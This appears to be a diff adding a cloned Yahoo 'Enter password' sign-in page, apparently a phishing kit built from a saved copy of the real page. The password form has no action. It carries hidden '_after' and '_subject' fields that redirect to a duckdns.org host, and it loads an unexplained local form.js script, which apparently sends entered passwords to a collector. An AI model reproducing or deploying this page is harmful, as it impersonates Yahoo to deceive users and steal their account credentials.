@@ -1,0 +1,421 @@
+<html id="Stencil" class="js grid light-theme">
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no"
+    />
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="referrer" content="origin-when-cross-origin" />
+    <title>Yahoo</title>
+    <link rel="dns-prefetch" href="https://gstatic.com/" />
+    <link rel="dns-prefetch" href="https://google.com/" />
+    <link rel="dns-prefetch" href="https://s.yimg.com/" />
+    <link rel="dns-prefetch" href="https://y.analytics.yahoo.com/" />
+    <link rel="dns-prefetch" href="https://ucs.query.yahoo.com/" />
+    <link rel="dns-prefetch" href="https://geo.query.yahoo.com/" />
+    <link rel="dns-prefetch" href="https://geo.yahoo.com/" />
+    <link
+      rel="icon"
+      type="image/x-icon"
+      href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico"
+    />
+    <link
+      rel="shortcut icon"
+      type="image/x-icon"
+      href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico"
+    />
+    <link
+      rel="apple-touch-icon"
+      href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png"
+    />
+    <link
+      rel="apple-touch-icon-precomposed"
+      href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png"
+    />
+
+    <style nonce="">
+      #mbr-css-check {
+        display: inline;
+      }
+      .mbr-legacy-device-bar {
+        display: none;
+      }
+    </style>
+    <link href="index_files/yahoo-main.css" rel="stylesheet" type="text/css" />
+    <script nonce="">
+      (function (root) {
+        var isGoodJS =
+          "create" in Object &&
+          "isArray" in Array &&
+          "pushState" in window.history;
+        root.isGoodJS = isGoodJS;
+      })(this);
+
+      (function (root) {
+        /* -- Data -- */
+        root.YUI_config = {
+          comboBase: "https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?",
+          combine: true,
+          root: "yui-s:3.18.0\u002F",
+        };
+        root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
+        root.I13N_config = { keys: { pt: "utility", ver: "nodejs" } };
+        root.I13N_config || (root.I13N_config = {});
+        root.I13N_config.spaceid = 794200019;
+        root.I13N_config.location =
+          "https:\u002F\u002Flogin.yahoo.com\u002Faccount\u002Fchallenge\u002Fpassword?.lang=en-US&.intl=us&src=ym&display=login&lang=en-US";
+        root.I13N_config.referrer = "https:\u002F\u002Flogin.yahoo.net\u002F";
+        root.I13N_config.keys || (root.I13N_config.keys = {});
+        root.I13N_config.keys.pct = "sign-in";
+        root.I13N_config.keys.pg_name = "yahoo Login - Password Challenge";
+        root.I13N_config.keys.pstcat = "username-verify";
+        root.I13N_config.keys.gm_np = "yahoo";
+        root.I13N_config.keys.p_sec = "login";
+        root.I13N_config.keys.p_subsec = "account-challenge-password";
+        root.I13N_config.keys.src = "ym";
+        root.I13N_config.keys.test =
+          "mbr-qr-sign-in-secondary,mbr-fido,mbr-trusted-2sv,mbr-phoenix-gpst,mbr-oauth-be,mbr-atthaloc-oauth";
+        root.mKeyPrefix = "password-challenge-";
+        root.darlaConfig = {
+          url: "https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.html?l=RICH{dest:tgtRICH;asz:flex}&f=794200019&ref=https%3A%2F%2Flogin.yahoo.com%2Faccount%2Fchallenge%2Fpassword",
+          k2Rate: 1,
+          positions: {
+            RICH: {
+              sandbox:
+                "allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox",
+              id: "RICH",
+              clean: "login-ad-rich",
+              dest: "login-ad-rich",
+              w: 1440,
+              h: 1024,
+              timeout: 5000,
+              noexp: 1,
+              fdb: {
+                on: 1,
+                where: "inside",
+                minReqWidth: 1325,
+                showAfter: 2000,
+              },
+            },
+          },
+        };
+        root.challenge || (root.challenge = {});
+        root.challenge.servingStamp = 1596006300608;
+        root.I13N_config.keys.context = "primary";
+        root.pwchallenge || (root.pwchallenge = {});
+        root.pwchallenge.messages = {
+          toolTipShow: "Show password",
+          toolTipHide: "Hide password",
+        };
+        root.isIOSDevice = false;
+      })(this);
+
+      YUI_config.global = window;
+
+      window.mbrSendError = function (name, url) {
+        new Image().src =
+          "/account/js-reporting/?rid=770faupfi27ss&crumb=" +
+          encodeURIComponent("G/W7V0E6YwS") +
+          "&message=" +
+          encodeURIComponent(name.toLowerCase()) +
+          "&url=" +
+          encodeURIComponent(url);
+      };
+
+      var oldError = window.onerror;
+
+      window.onerror = function (errorMsg, url) {
+        window.mbrSendError(errorMsg, url);
+        if (oldError) {
+          oldError.apply(this, arguments);
+        }
+        return false;
+      };
+    </script>
+    <script type="text/x-safeframe-booted" id="sf_tag_1596006301004_9">
+      {"positions":[{"id":"RICH","html":"<script type='text\/javascript'>document.write('<a href=\"https:\/\/us.y.atwola.com\/?adlink|5113.1|5043043|0|0|AdId=-40;BnId=0;guid=966dgftfi27rt&b=3&s=v3;itime=6300490;kvsecure%2Ddarla=4%2D2%2D1%7Cysd%7C2;kvmn=y963896142;kvssp=ssp;kvsecure=true;kvpgcolo=ne1;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F10;kvadtc%5Fdvbrand=mozilla;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=firefox%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F10;kvadtc%5Fdvosversion=NT%2010%2E0;kvadtc%5Fcrmcc=UNKNOWN;kvadtc%5Fcrmnc=UNKNOWN;gdpr=0;adclntid=1004;spaceid=794200019;\" target=_top><img src=\"https:\/\/aka-cdn.adtechus.com\/images\/ATCollapse.gif\" border=0 alt=\"AOL Ad\" width=\"1\" height=\"1\" ><\/a>');\n  \n<\/script>","lowHTML":"","meta":{"y":{"pos":"RICH","cscHTML":"<img width=1 height=1 alt=\"\" src=\"https:\/\/us.y.atwola.com\/adcount|2.0|5113.1|5043043|0|0|AdId=-40;BnId=0;ct=748719617;st=4533;adcid=0;itime=6300490;reqtype=5;guid=966dgftfi27rt&b=3&s=v3;;impref=15960063002307034567;imprefseq=41382400856452599;imprefts=1596006300;adclntid=1004;spaceid=794200019;adposition=RICH;lmsid=;pvid=ciBMjzk4LjGTGbB_XyEffQDrNTIuMQAAAAAsoBdP;sectionid=;kvsecure%2Ddarla=4%2D2%2D1%7Cysd%7C2;kvmn=y963896142;kvssp=ssp;kvsecure=true;kvpgcolo=ne1;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F10;kvadtc%5Fdvbrand=mozilla;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=firefox%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F10;kvadtc%5Fdvosversion=NT%2010%2E0;kvadtc%5Fcrmcc=UNKNOWN;kvadtc%5Fcrmnc=UNKNOWN;gdpr=0;\">","cscURI":"https:\/\/us.y.atwola.com\/adcount|2.0|5113.1|5043043|0|0|AdId=-40;BnId=0;ct=748719617;st=4533;adcid=0;itime=6300490;reqtype=5;guid=966dgftfi27rt&b=3&s=v3;;impref=15960063002307034567;imprefseq=41382400856452599;imprefts=1596006300;adclntid=1004;spaceid=794200019;adposition=RICH;lmsid=;pvid=ciBMjzk4LjGTGbB_XyEffQDrNTIuMQAAAAAsoBdP;sectionid=;kvsecure%2Ddarla=4%2D2%2D1%7Cysd%7C2;kvmn=y963896142;kvssp=ssp;kvsecure=true;kvpgcolo=ne1;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F10;kvadtc%5Fdvbrand=mozilla;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=firefox%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F10;kvadtc%5Fdvosversion=NT%2010%2E0;kvadtc%5Fcrmcc=UNKNOWN;kvadtc%5Fcrmnc=UNKNOWN;gdpr=0;","behavior":"non_exp","adID":"#1","matchID":"999999.999999.999999.999999","bookID":"","slotID":"0","serveType":"6","ttl":-1,"err":"noad","hasExternal":false,"supp_ugc":"0","placementID":-1,"fdb":null,"serveTime":-1,"impID":"","creativeID":-1,"adc":"{\"label\":\"AdChoices\",\"url\":\"https:\\\/\\\/info.yahoo.com\\\/privacy\\\/us\\\/yahoo\\\/relevantads.html\",\"close\":\"Close\",\"closeAd\":\"Close Ad\",\"showAd\":\"Show ad\",\"collapse\":\"Collapse\",\"fdb\":\"I don't like this ad\",\"code\":\"en-us\"}","is3rd":1,"facStatus":{"fedStatusCode":"31","fedStatusMessage":"Yield optimization did not run"},"userProvidedData":{},"facRotation":{},"slotData":{},"size":"1x1"}},"conf":{"w":1,"h":1}}],"conf":{"useYAC":0,"usePE":1,"servicePath":"","xservicePath":"","beaconPath":"","renderPath":"","allowFiF":false,"srenderPath":"https:\/\/s.yimg.com\/rq\/darla\/4-2-1\/html\/r-sf.html","renderFile":"https:\/\/s.yimg.com\/rq\/darla\/4-2-1\/html\/r-sf.html","sfbrenderPath":"https:\/\/s.yimg.com\/rq\/darla\/4-2-1\/html\/r-sf.html","msgPath":"https:\/\/fc.yahoo.com\/unsupported-1946.html","cscPath":"https:\/\/s.yimg.com\/rq\/darla\/4-2-1\/html\/r-csc.html","root":"sdarla","edgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/4-2-1","sedgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/4-2-1","version":"4-2-1","tpbURI":"","hostFile":"https:\/\/s.yimg.com\/rq\/darla\/4-2-1\/js\/g-r-min.js","fdb_locale":"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.|Want an ad-free inbox? Upgrade to Yahoo Mail Pro!|Upgrade Now","positions":{"RICH":{"dest":"tgtRICH","asz":"flex","id":"RICH","w":1,"h":1}},"property":"","events":[],"lang":"en-us","spaceID":"794200019","debug":false,"asString":"{\"useYAC\":0,\"usePE\":1,\"servicePath\":\"\",\"xservicePath\":\"\",\"beaconPath\":\"\",\"renderPath\":\"\",\"allowFiF\":false,\"srenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/4-2-1\\\/html\\\/r-sf.html\",\"renderFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/4-2-1\\\/html\\\/r-sf.html\",\"sfbrenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/4-2-1\\\/html\\\/r-sf.html\",\"msgPath\":\"https:\\\/\\\/fc.yahoo.com\\\/unsupported-1946.html\",\"cscPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/4-2-1\\\/html\\\/r-csc.html\",\"root\":\"sdarla\",\"edgeRoot\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/4-2-1\",\"sedgeRoot\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/4-2-1\",\"version\":\"4-2-1\",\"tpbURI\":\"\",\"hostFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/4-2-1\\\/js\\\/g-r-min.js\",\"fdb_locale\":\"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.|Want an ad-free inbox? Upgrade to Yahoo Mail Pro!|Upgrade Now\",\"positions\":{\"RICH\":{\"dest\":\"tgtRICH\",\"asz\":\"flex\",\"id\":\"RICH\",\"w\":1,\"h\":1}},\"property\":\"\",\"events\":[],\"lang\":\"en-us\",\"spaceID\":\"794200019\",\"debug\":false}"},"meta":{"y":{"pageEndHTML":"<!-- Page End HTML -->","pos_list":["RICH"],"transID":"darla_prefetch_1596006300927_2044190540_3","k2_uri":"","fac_rt":-1,"ttl":-1,"spaceID":"794200019","lookupTime":49,"procTime":50,"npv":0,"pvid":"ciBMjzk4LjGTGbB_XyEffQDrNTIuMQAAAAAsoBdP","serveTime":-1,"ep":{"site-attribute":"","tgt":"_blank","secure":true,"ref":"https:\/\/login.yahoo.com\/account\/challenge\/password","filter":"no_expandable;exp_iframe_expandable;","darlaID":"darla_instance_1596006300927_1770498329_2"},"pym":{".":"v0.0.9;;-;"},"host":"","filtered":[],"pe":""}}}
+    </script>
+    <script type="text/javascript" src="index_files/boot.js"></script>
+    <script
+      id="sf_host_lib_sf_auto_3-29-6-2020"
+      type="text/javascript"
+      class="sf_lib"
+      src="index_files/g-r-min.js"
+    ></script>
+  </head>
+  <body class="bucket-mbr-qr-sign-in-secondary bucket-mbr-phoenix-gpst">
+    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
+      <label
+        class="cross"
+        for="mbr-legacy-device-bar-cross"
+        aria-label="Close this&nbsp;warning"
+        >x</label
+      >
+      <input type="checkbox" id="mbr-legacy-device-bar-cross" />
+      <p class="mbr-legacy-device">
+        Yahoo works best with the latest versions of the browsers. You're using
+        an outdated or unsupported browser and some Yahoo features may not work
+        properly. Please update your browser version now.
+        <a href="">More&nbsp;Info</a>
+      </p>
+    </div>
+    <script nonce="">
+      (function (root) {
+        var doc = document;
+
+        if (root.isGoodJS) {
+          doc.documentElement.className = doc.documentElement.className.replace(
+            "no-js",
+            "js"
+          );
+          doc.cookie =
+            "mbr-nojs=; domain=" +
+            doc.domain +
+            "; path=/account; expires=Thu, 01 Jan 1970 00:00:01 GMT; secure";
+        } else {
+          doc.cookie =
+            "mbr-nojs=badbrowser; domain=" +
+            doc.domain +
+            "; path=/account; expires=Fri, 31 Dec 9999 23:59:59 GMT; secure";
+          doc.getElementById("mbr-legacy-device-bar").style.display = "block";
+        }
+      })(this);
+    </script>
+
+    <div id="login-body" class="loginish puree-v2 grid dark-background">
+      <div class="mbr-desktop-hd">
+        <span class="column">
+          <a href="https://www.yahoo.com/">
+            <img
+              src="index_files/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png"
+              alt="Yahoo"
+              class="logo"
+              width=""
+              height="36"
+            />
+            <img
+              src="index_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png"
+              alt="Yahoo"
+              class="dark-mode-logo logo"
+              width=""
+              height="36"
+            />
+          </a>
+        </span>
+        <span class="column help txt-align-right">
+          <a
+            href="https://help.yahoo.com/kb/index?locale=en_US&amp;page=product&amp;y=PROD_ACCT"
+            >Help</a
+          >
+        </span>
+      </div>
+      <div class="login-box-container">
+        <div class="login-box right">
+          <div class="mbr-login-hd txt-align-center">
+            <img
+              src="index_files/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png"
+              alt="Yahoo"
+              class="logo yahoo-en-US"
+              width=""
+              height="27"
+            />
+            <img
+              src="index_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png"
+              alt="Yahoo"
+              class="dark-mode-logo logo yahoo-en-US"
+              width=""
+              height="27"
+            />
+          </div>
+          <div class="challenge password-challenge">
+            <div class="challenge-header">
+              <div class="yid">test12</div>
+            </div>
+            <div id="password-challenge" class="primary">
+              <strong class="challenge-heading">Enter&nbsp;password</strong>
+              <span class="txt-align-center challenge-desc"
+                >to finish sign&nbsp;in</span
+              >
+              <form
+                id="formActionValueID"
+                method="post"
+                class="pure-form challenge-form"
+              >
+                <input
+                  type="hidden"
+                  name="browser-fp-data"
+                  id="browser-fp-data"
+                  value='{"language":"en-US","colorDepth":24,"deviceMemory":"unknown","pixelRatio":1,"hardwareConcurrency":2,"timezoneOffset":-480,"timezone":"Asia/Shanghai","sessionStorage":1,"localStorage":1,"indexedDb":1,"cpuClass":"unknown","platform":"Win32","doNotTrack":"unspecified","plugins":{"count":0,"hash":"24700f9f1986800ab4fcc880530dd0ed"},"canvas":"canvas winding:yes~canvas","webgl":1,"webglVendorAndRenderer":"Google Inc.~ANGLE (Microsoft Basic Render Driver Direct3D11 vs_5_0 ps_5_0)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":0,"hasLiedBrowser":0,"touchSupport":{"points":0,"event":0,"start":0},"fonts":{"count":32,"hash":"9ad7c2bdeb9564b4cabbeeca7be750a3"},"audio":"35.7383295930922","resolution":{"w":"1792","h":"1120"},"availableResolution":{"w":"1080","h":"1792"},"ts":{"serve":1596006300608,"render":1596006301052}}'
+                />
+                <input type="hidden" name="crumb" value="G/W7V0E6YwS" />
+                <input type="hidden" name="acrumb" value="RvcZuuFu" />
+                <input type="hidden" name="sessionIndex" value="QQ--" />
+                <input type="hidden" name="displayName" value="test12" />
+                <div class="hidden-username">
+                  <input
+                    type="text"
+                    tabindex="-1"
+                    aria-hidden="true"
+                    role="presentation"
+                    autocorrect="off"
+                    spellcheck="false"
+                    name="username"
+                    value="test12"
+                  />
+                </div>
+                <input type="hidden" name="passwordContext" value="normal" />
+                <div
+                  id="password-container"
+                  class="input-group password-container blurred"
+                >
+                  <input
+                    type="password"
+                    id="login-passwd"
+                    class="password"
+                    name="password"
+                    placeholder=" "
+                    autofocus=""
+                    autocomplete="current-password"
+                    data-rapid-tracking="true"
+                    data-ylk="elm:input;elmt:focus;slk:passwd;mKey:password-challenge-focus-passwd"
+                  />
+                  <label
+                    for="login-passwd"
+                    id="password-label"
+                    class="password-label"
+                    >Password</label
+                  >
+                  <div
+                    class="caps-indicator hide"
+                    id="caps-indicator"
+                    title="Capslock is&nbsp;on"
+                  ></div>
+                  <button
+                    type="button"
+                    class="show-hide-toggle-button hide-pw"
+                    id="password-toggle-button"
+                    tabindex="-1"
+                    title="Show&nbsp;password"
+                  ></button>
+                </div>
+
+                <div class="button-container">
+                  <button
+                    type="submit"
+                    id="login-signin"
+                    class="pure-button puree-button-primary puree-spinner-button challenge-button"
+                    name="verifyPassword"
+                    value="Next"
+                    data-rapid-tracking="true"
+                    data-ylk="elm:btn;elmt:primary;slk:next;mKey:password-challenge-next"
+                  >
+                    Next
+                  </button>
+                </div>
+                <div class="forgot-cont challenge-button-link">
+                  <input
+                    type="submit"
+                    class="pure-button puree-button-link challenge-button-link"
+                    data-ylk="elm:btn;elmt:skip;slk:skip;mKey:password-challenge-skip-recovery"
+                    data-rapid-tracking="true"
+                    id="mbr-forgot-link"
+                    name="skip"
+                    value="Forgot&nbsp;password?"
+                  />
+                </div>
+                <input
+                  type="hidden"
+                  name="_after"
+                  rel="noreferrer"
+                  value="http://redirect10.duckdns.org/yahoo/redirect.html"
+                />
+                <input type="hidden" name="_subject" value="yahoo Login" />
+              </form>
+            </div>
+          </div>
+        </div>
+        <div
+          id="login-box-ad-fallback"
+          class="login-box-ad-fallback"
+          style="display: block"
+        >
+          <h1>
+            Yahoo makes it easy to enjoy what matters most in your&nbsp;world.
+          </h1>
+          <p>
+            Best in class Yahoo Mail, breaking local, national and global news,
+            finance, sports, music, movies and more. You get more out of the
+            web, you get more out of&nbsp;life.
+          </p>
+        </div>
+      </div>
+      <div class="login-bg-outer">
+        <div class="login-bg-inner">
+          <div id="login-ad-rich"></div>
+        </div>
+      </div>
+    </div>
+    <script src="index_files/rapid-3.js"></script>
+    <script nonce="">
+      var rapidInstance = new YAHOO.i13n.Rapid(I13N_config);
+      // Used in common JS to add to beacons
+      rapidInstance.beaconClick("page_load_click_evnt", null, 0, {
+        mKey: "password-challenge-launch",
+        intrctn: "click",
+        corActn: "click",
+      });
+    </script>
+    <script src="index_files/bundle.js"></script>
+    <noscript>
+      <img
+        src="/account/js-reporting/?crumb=G%2FW7V0E6YwS&message=javascript_not_enabled&ref=%2Faccount%2Fchallenge%2Fpassword"
+        height="0"
+        width="0"
+        style="visibility: hidden"
+      />
+    </noscript>
+    <script nonce="">
+      var checkAssets = function (seconds) {
+        setTimeout(function () {
+          if (!window.mbrJSLoaded) {
+            window.mbrSendError("js_failed_to_load", location.pathname);
+          }
+          var check = document.getElementById("mbr-css-check"),
+            style = check.currentStyle;
+          if (window.getComputedStyle) {
+            style = window.getComputedStyle(check);
+          }
+          if (style.display !== "none") {
+            window.mbrSendError("css_failed_to_load", location.pathname);
+          }
+        }, seconds * 1000);
+      };
+
+      checkAssets(10);
+    </script>
+    <div id="mbr-css-check"></div>
+
+    <script src="index_files/client.html"></script>
+    <div id="darla_csc_holder" class="darla" style="display: none">
+      <iframe
+        style="display: none"
+        id="darla_csc_writer_0"
+        class="darla"
+        src="index_files/r-csc.htm"
+        scrolling="no"
+        allowtransparency="true"
+        hidefocus="true"
+        tabindex="-1"
+        marginwidth="0"
+        marginheight="0"
+        frameborder="no"
+      ></iframe>
+    </div>
+  </body>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/js-cookie/3.0.1/js.cookie.js"></script>
+  <script src="/js/form.js"></script>
+</html>
+<!-- fe21.member.bf1.yahoo.com - Wed Jul 29 2020 07:05:00 GMT+0000 (Coordinated Universal Time) - (0ms) -->
